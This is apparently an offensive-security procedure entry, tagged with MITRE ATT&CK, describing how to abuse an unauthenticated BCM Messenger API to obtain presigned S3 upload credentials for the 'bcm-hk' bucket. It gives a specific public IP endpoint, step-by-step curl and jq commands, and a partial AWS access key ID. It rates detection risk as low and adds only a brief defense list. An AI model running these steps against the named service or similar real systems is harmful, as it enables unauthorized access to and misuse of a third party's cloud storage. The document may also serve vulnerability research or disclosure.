---
id: proc-uuid-003
tags:
  - presigned-url
  - s3
  - api-exploit
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:20.924Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Generate-Presigned-S3-Upload-Credentials

## Summary

This procedure calls the unprotected BCM Messenger API endpoint to generate presigned S3 POST credentials, enabling uploads to the 'bcm-hk' bucket without authentication.

## Description

The API at http://47.52.75.65:8080//v1/attachments/s3/upload_certification generates JSON with presigned data: postUrl, key (e.g., profile/randompath), X-Amz-Credential, X-Amz-Date, X-Amz-Algorithm (AWS4-HMAC-SHA256), Policy (base64-encoded JSON with bucket 'bcm-hk', content-length 1-67108864), and X-Amz-Signature. No user validation occurs, allowing anyone to request credentials for arbitrary uploads.

## Requirements

1. Access to the API endpoint (publicly exposed)
2. HTTP client (curl, Postman, or Python requests)
3. Knowledge of request format from traffic analysis

## Defense

Defensive measures and detection strategies:

- Require authentication and user session validation before generating presigned URLs
- Implement file type/content validation in the policy
- Monitor S3 access logs for anomalous presigned usage from unknown IPs

## Objectives

1. Obtain valid presigned POST data for S3
2. Parse credentials for subsequent upload
3. Exploit lack of restrictions on credential generation

## Instructions

### Step 1: Prepare Request

**Context**: Mimic the app's request body if needed (often empty JSON).

Use curl to send a POST:

```bash
curl -X POST http://47.52.75.65:8080//v1/attachments/s3/upload_certification \
  -H "Content-Type: application/json" \
  -d '{}'
```

**Expected Output**: JSON response with presigned fields.

### Step 2: Parse Response

**Context**: Extract key fields from the JSON for upload use.

Save response to file and parse:

```bash
curl ... > presigned.json
cat presigned.json | jq '.postUrl, .key, .Policy, ."X-Amz-Signature"'
```

> Fields include: downloadUrl, postUrl ('https://bcm-hk.s3.ap-east-1.amazonaws.com/'), key, X-Amz-Credential ('AKIA3NG2JXZC3SY2WNXE/...'), etc. Policy conditions limit size but not content.

### Step 3: Verify Credentials

**Context**: Test if credentials allow a small upload (optional validation).

Use the data in a minimal POST to S3 (see upload procedure).

**Expected Output**: No auth errors; credentials valid for ~15 minutes.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- presigned-url
- credential-abuse
- aws-s3
